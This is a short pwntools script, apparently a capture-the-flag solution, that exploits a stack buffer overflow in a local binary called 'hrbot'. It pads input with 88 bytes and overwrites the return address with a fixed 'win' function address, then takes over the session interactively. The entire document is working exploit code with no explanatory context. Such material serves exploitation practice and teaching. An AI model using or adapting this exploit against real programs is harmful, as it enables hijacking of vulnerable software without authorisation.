from pwn import *

elf = ELF('./hrbot') 
context.arch = 'amd64' 
p = process("./hrbot")
p.sendlineafter(b'>', b'1')

OFFSET = 88               
WIN_FUNC_ADDRESS = 0x0000000000401256   
payload = b'A' * OFFSET + p64(WIN_FUNC_ADDRESS)
p.sendlineafter(b'characters.', payload)
p.interactive()
